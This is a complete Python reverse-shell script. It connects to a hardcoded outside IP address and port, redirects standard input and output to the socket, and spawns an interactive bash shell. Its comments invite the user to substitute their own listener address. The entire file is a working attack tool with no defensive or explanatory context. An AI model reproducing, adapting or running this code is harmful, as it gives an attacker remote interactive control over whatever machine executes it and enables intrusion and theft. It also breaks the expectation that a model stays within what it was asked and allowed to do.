#!/usr/bin/env python3
import os
import socket
import pty

# Set your LHOST and LPORT here
LHOST = '107.175.243.19'     # Replace with your IP address
LPORT = 51000		     # Replace with your port number

# Create a socket connection
s = socket.socket()
s.connect((LHOST, LPORT))

# Redirect input/output to the socket
[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]

# Spawn a bash shell
pty.spawn("/bin/bash")
